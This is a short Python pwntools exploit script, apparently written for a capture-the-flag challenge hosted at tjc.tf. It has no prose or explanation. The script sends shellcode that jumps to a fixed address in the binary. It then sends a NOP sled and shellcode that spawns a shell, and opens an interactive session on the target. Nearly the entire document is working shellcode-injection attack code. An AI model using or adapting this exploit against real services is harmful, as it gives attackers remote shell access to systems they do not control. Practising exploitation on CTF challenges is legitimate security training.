#!/usr/bin/python3
from pwn import *
gs = '''
b main
continue
'''
elf = context.binary = ELF('./out')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./out', gdbscript=gs)
    if args.REMOTE:
        return remote('tjc.tf', 31456)
    else:
        return process('./out')
r = start()
#========= exploit here ===================

payload = asm('''
    mov rdx, 0x401136
    call rdx
    ''')


print(hex(len((payload))))

r.sendline(payload)

payload = b"\x90"*0x20
payload += asm(shellcraft.sh())

r.sendline(payload)

#========= interactive ====================
r.interactive()
